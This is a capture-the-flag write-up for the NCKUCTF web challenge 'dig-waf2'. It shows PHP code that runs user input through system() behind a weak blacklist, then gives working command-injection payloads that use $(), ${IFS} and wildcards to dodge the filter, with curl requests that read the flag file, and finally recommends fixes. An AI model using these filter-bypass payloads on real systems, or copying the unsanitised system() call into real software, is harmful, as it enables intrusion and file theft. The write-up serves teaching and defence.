# Dig-Waf2




{{< admonition tldr "TL;DR" >}}

**dig-waf2** is a web challenge from **NCKUCTF**. * **Challenge Name** : dig-waf2 * **Category** : WEB * **Organizer** : NCKUCTF * **Writeup Author** : spawn2pwn

{{< /admonition >}}

## **1. Identity Challenge**

* **Challenge Name** : dig-waf2
* **Category** : WEB
* **Organizer** : NCKUCTF
* **Writeup Writer** : spawn2pwn

---

## **2. Problem Description**

This challenge provides an input form to perform a DNS lookup using the command `dig` .

The user is asked to enter the domain, then the server will execute the command and display the results.

However, different from the previous challenge, there is a filtering mechanism (simple WAF) which aims to prevent exploitation.

Main goals:

> **Obtain FLAG by bypassing WAF protection and exploiting command injection**

---

## **3. System Analysis**

Main source code snippet:

```php
$blacklist = ['|', '&', ';', '>', '<', "
", " ", 'flag'];

$is_bad = false;
foreach ($blacklist as $bad_word)
    if (strpos($_POST['name'], $bad_word) !== false)
        $is_bad = true;

if ($is_bad)
    echo "BAD HACKER!!!";
else
    system("dig '" . $_POST['name'] . "';");
```

### Mechanisms:

1. User input is received via the POST parameter `name` 2. Input is checked against a blacklist of certain characters

3. If it passes the filter, the input is entered into the command:

```bash
   dig '<input>';
   ```

4. Command is executed using `system()` ---

## **4. Identify Vulnerabilities**

The primary vulnerability:

> **Command Injection with WAF bypass**

Even though there is a blacklist, this filter has weaknesses:

### WAF Disadvantages:

* Only uses **blacklist**, not whitelist
* Non-blocking:

  * `$()` (command substitution)
  * wildcard ( `*` )
* Blocks spaces, but can be bypassed with `${IFS}` * Blocks the word `flag` , but can be bypassed with a wildcard ( `fla*` )

---

## **5. Exploitation Methodology**

### **5.1 Verify Command Injection**

Payloads:

```bash
'$(whoami)'
```

Request:

```bash
curl -X POST "https://chall.nckuctf.org:28115/" \
-d "name='$(whoami)'"
```

Output:

```
www-data
```

Showing that:

> Command injection was successful via **command substitution `$()` **

---

### **5.2 Space Filter Bypass**

Since spaces are blocked, `${IFS}` is used instead of spaces.

Payloads:

```bash
'$(ls${IFS}/)'
```

---

### **5.3 File System Enumeration**

```bash
curl -X POST "https://chall.nckuctf.org:28115/" \
-d "name='$(ls${IFS}/)'"
```

Results:

```
bin boot dev etc flag_o2837ry home ...
```

Found suspicious files:

```
flag_o2837ry
```

---

### **5.4 Bypass Filter Word "flag"**

Since the word `flag` is blocked, a wildcard is used:

```bash
fla*
```

---

### **5.5 Reading Flag Files**

Payloads:

```bash
'$(cat${IFS}/fla*)'
```

Request:

```bash
curl -X POST "https://chall.nckuctf.org:28115/" \
-d "name='$(cat${IFS}/fla*)'"
```

---

### **5.6 Flag Extraction**

Output:

```
NCKUCTF{d19_70015_15_m491c!}
```

---

## **6. Exploitation Results**

FLAG was successfully obtained:

```
NCKUCTF{d19_70015_15_m491c!}
```

---

## **7. Discussion**

The primary vulnerability:

1. **Use of system() without safe sanitization**

```php
   system("dig '" . $_POST['name'] . "';");
   ```

2. **Weak blacklist based WAF**

   *Does not cover all injection techniques
   * Easy to bypass with techniques:

     * `${IFS}` for spaces
     * `$()` for command execution
     * wildcard to avoid keywords

3. **Do not escape shell arguments**

---

## **8. Improvement Recommendations**

### **1. Use escapeshellarg()**

```php
system("dig " . escapeshellarg($_POST['name']));
```

---

### **2. Use input whitelist**

```php
if (!filter_var($_POST['name'], FILTER_VALIDATE_DOMAIN)) {
    die("Invalid domain");
}
```

---

### **3. Avoid using system()**

Use safer approaches such as:

```php
exec("dig " . escapeshellarg($domain), $output);
```

or use the DNS resolver library.

---

## **9. Conclusion**

This challenge shows that:

> **Blacklisting is not an effective security solution**

With simple techniques such as:

* Command substitution `$()` * Space replacement `${IFS}` * Wildcard bypass

Attackers can still:

* Execute commands
* Perform system enumeration
* Reading sensitive files

---

## **10. Attachments**

### **Source Code**

```php
system("dig '" . $_POST['name'] . "';");
```

---

### **Payload Exploit**

```bash
'$(cat${IFS}/fla*)'
```

---

### **Request**

```bash
curl -X POST "https://chall.nckuctf.org:28115/" \
-d "name='$(cat${IFS}/fla*)'"
```

---

### **Flag Extraction**

```bash
curl -X POST -s "https://chall.nckuctf.org:28115/" \
-d "name='$(cat${IFS}/fla*)'" \
| grep -o "NCKUCTF{.*}"
```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/dig-waf2/  

